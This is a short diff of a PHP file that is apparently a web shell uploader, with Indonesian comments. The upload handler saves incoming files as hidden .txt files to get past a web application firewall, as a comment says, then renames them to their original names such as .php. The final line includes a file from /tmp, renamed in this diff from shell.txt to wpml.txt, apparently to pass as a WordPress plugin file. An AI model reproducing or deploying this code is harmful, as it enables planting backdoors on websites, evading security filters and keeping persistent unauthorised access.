@@ -1,4 +1,5 @@
 <?php
+ob_start(); // <-- Ini mencegah error "headers already sent"
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
 
@@ -22,7 +23,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploadfile']) && $_F
     // Upload sebagai .txt dulu biar lolos WAF
     $temp_name = $cwd . '/.' . md5(uniqid()) . '.txt';
     if (move_uploaded_file($tmp, $temp_name)) {
-        // Rename ke nama asli (.php)
         if (rename($temp_name, $cwd . '/' . $name)) {
             header("Location: ?d=" . urlencode($cwd) . "&msg=Upload+Sukses+(Bypass)");
             exit;
@@ -32,5 +32,5 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['uploadfile']) && $_F
     exit;
 }
 
-include("/tmp/shell.txt");
+include("/tmp/wpml.txt");
 ?>
